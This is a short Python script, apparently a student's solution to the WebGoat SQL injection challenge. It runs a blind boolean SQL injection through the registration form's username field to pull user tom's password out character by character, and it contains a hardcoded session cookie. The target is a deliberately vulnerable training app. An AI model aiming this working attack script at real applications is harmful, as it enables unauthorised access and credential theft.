import requests
import string


letters = string.ascii_letters
pos = 1
password = ''
header = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest'
}

cookies = {
    'JSESSIONID': '4C322D560CDACCD0285413BF07A536C9'
}

for x in range(1, 30):
    for i in range(len(letters)):
        combination = password + letters[i]
        sql_q = "tom' AND substring(password,1,%s) = '%s' ; --" % (x, combination)

        data = {
            'username_reg': sql_q,
            'email_reg': 't@t',
            'password_reg': '1',
            'confirm_password_reg': '1'
        }

        response = requests.put('http://jupyterhub.stud.hshl.net:8443/WebGoat/SqlInjection/challenge', data=data,
                                headers=header, cookies=cookies)
        if 'already exists' in response.text:
            password += letters[i]
            print(password)
            break
        else:
            print('Not quite right: ' + password + letters[i])
